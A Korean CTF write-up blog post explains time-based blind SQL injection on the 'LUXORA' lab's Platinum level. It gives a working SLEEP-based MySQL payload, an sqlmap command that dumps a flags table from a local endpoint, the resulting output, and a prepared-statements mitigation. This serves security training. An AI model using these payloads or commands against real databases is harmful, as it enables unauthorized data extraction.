+++
title = "VulnABLE CTF [LUXORA]: SQL Injection 💎 Platinum (Time-based Blind SQLi)"
description = "LUXORA 플랫폼의 Time-based Blind SQLi 플래그 획득 시나리오 및 원리 분석"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SQL Injection", "Platinum", "Time-based"]
+++

# VulnABLE CTF [LUXORA]: SQL Injection 💎 Platinum

Gold 난이도에서는 화면의 참/거짓 변화(UI 변화)를 통해 데이터를 빼냈습니다. 하지만 **Platinum 난이도**인 `/sqli/platinum` 라우트에서는 화면에 아무런 정보도 출력되지 않고, 결과가 참이든 거짓이든 항상 동일한 화면("Request Processed")만 보여줍니다.

이처럼 화면 변화조차 없을 때 해커가 의존하는 것은 바로 **'시간(Time)'**입니다. 이를 **Time-based Blind SQL Injection**이라고 합니다.

---

## 🕒 1. 타겟 탐색 및 반응 분석 (Reconnaissance)

`/sqli/platinum` 페이지는 사용자의 이메일 구독(Subscribe) 요청을 처리하는 엔드포인트입니다.

* `POST /sqli/platinum` (data: `email=test@test.com`) ➔ 응답: `Request Processed`
* `POST /sqli/platinum` (data: `email=test' OR 1=1--`) ➔ 응답: `Request Processed`

**[해커의 사고 과정]**
* 입력값에 뭘 넣든 항상 똑같은 응답이 돌아온다. 에러 기반(Error-based)도, 참거짓 기반(Boolean-based)도 불가능하다.
* 그렇다면 데이터베이스가 내 쿼리를 실행하면서 **인위적인 지연(Delay)**을 일으키도록 유도해보자.

---

## 🕒 2. 취약점 식별 및 지연 유도 (Exploitation)

데이터베이스가 지원하는 시간 지연 함수(예: MySQL의 `SLEEP()`, PostgreSQL의 `pg_sleep()`)를 사용합니다.

### 💡 공격 원리: IF문과 SLEEP의 결합
"만약 데이터베이스 이름의 첫 글자가 'l'이면 5초 동안 멈춰(Sleep) 있고, 아니면 그냥 바로 응답해!" 라는 쿼리를 보냅니다.

* 페이로드 예시: `test@test.com' AND (SELECT IF(ASCII(SUBSTRING(database(),1,1))=108, SLEEP(5), 0))--`

### 🚀 수동 테스트
서버에 위 페이로드를 전송해봅니다.

* 108('l')을 물어봤을 때 ➔ 서버 응답이 **5초 뒤에** 도착함! (참이라는 뜻)
* 109('m')을 물어봤을 때 ➔ 서버 응답이 **즉시** 도착함! (거짓이라는 뜻)

이렇게 시간이 걸리는지 안 걸리는지를 타이머로 재어가며 한 글자씩 알아냅니다.

---

## 🕒 3. 자동화 도구 활용 (sqlmap)

Time-based 기법은 한 글자를 알아내는 데 5초씩 걸리므로 수동으로 하는 것은 미친 짓입니다. `sqlmap`을 사용하여 자동으로 시간을 재며 데이터를 추출합니다.

```bash
# Time-based Blind 기법(-T)을 사용하여 flags 테이블 덤프
$ sqlmap -u "http://localhost:3000/sqli/platinum" --data="email=test@test.com" --technique=T -D luxora_db -T platinum_flags --dump --batch
```

### 🔍 공격 결과 (Time-based Dump)
sqlmap이 알아서 5초 지연을 계산하며 매우 느리게(한 글자당 몇 초씩) 데이터를 뽑아냅니다.

```text
[INFO] retrieving entries for table 'platinum_flags' in database 'luxora_db'
[INFO] fetching number of entries for table 'platinum_flags' in database 'luxora_db'
[INFO] retrieved: 1
[INFO] fetching entries for table 'platinum_flags'
[INFO] retrieved: FLAG{SQLI_💎_TIME_7B8A9C}
```

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{SQLI_💎_TIME_7B8A9C}`

### 📝 왜 이런 공격이 성공했는가?
화면 출력을 완벽히 막았다고 하더라도, 백엔드 서버가 쿼리를 데이터베이스 엔진으로 넘겨서 실행시키는 구조 자체는 변하지 않았기 때문입니다. 해커는 데이터베이스의 내장 함수(`SLEEP`)를 호출할 수 있는 권한을 악용하여, 응답이 오는 시간을 네트워크 외부에서 측정하는 부채널 공격(Side-channel attack)을 수행한 것입니다.

### 🛡️ 방어 대책 (Mitigation)
Time-based 공격 또한 **Prepared Statements** 하나면 완벽히 방어됩니다. `SLEEP()`이라는 함수를 입력해도, 이를 함수로 실행하지 않고 그저 `'SLEEP(5)'`라는 문자열 데이터로 취급하게 되기 때문입니다.

다음은 SQL Injection의 끝판왕인 **Diamond 🔱 난이도**를 다루어 보겠습니다!